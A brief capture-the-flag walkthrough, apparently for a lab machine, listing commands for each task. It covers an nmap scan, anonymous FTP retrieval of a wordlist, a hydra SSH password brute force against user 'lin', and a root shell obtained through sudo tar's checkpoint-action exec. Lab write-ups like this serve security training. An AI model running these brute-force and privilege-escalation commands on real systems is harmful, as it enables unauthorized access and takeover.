Find open ports on the machine

nmap -sV -sC -A <machine ip address>

Who wrote the task list? 

ftp <machine ip address>
ls 
get task.txt -

What service can you bruteforce with the text file found?

ssh

What is the users password? 

ls 
get locks.txt -
hydra -l lin -P locks.txt ssh://<machine ip address>

user.txt

ssh lin@<machine ip address>
ls 
cat users.txt 

Root.txt

ls 
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
cd /root
ls
cat root.txt
